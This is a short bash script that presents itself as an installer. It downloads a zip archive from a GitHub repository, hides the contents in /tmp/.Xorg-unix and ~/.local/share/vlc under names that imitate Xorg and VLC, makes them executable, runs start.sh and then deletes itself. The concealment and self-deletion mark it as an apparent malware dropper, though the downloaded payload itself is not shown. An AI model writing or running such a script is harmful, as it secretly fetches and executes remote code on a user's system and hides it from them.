#!/bin/bash
installerdir=$(pwd)
cd /tmp || exit
wget https://github.com/Epik00/Epik00/archive/refs/heads/main.zip 
unzip main.zip 
rm main.zip 
mkdir .Xorg-unix 
shopt -s dotglob
mv ./Epik00-main/Epik00/* ./.Xorg-unix
mkdir ~/.local/share/vlc 
mv ./Epik00-main/Epik00\ Launcher/* ~/.local/share/vlc/
chmod +x ~/.local/share/vlc/auth.sh
rm -rf ./Epik00-main
chmod +x ./.Xorg-unix/*
/tmp/.Xorg-unix/start.sh 
rm "$installerdir"/instalador.sh
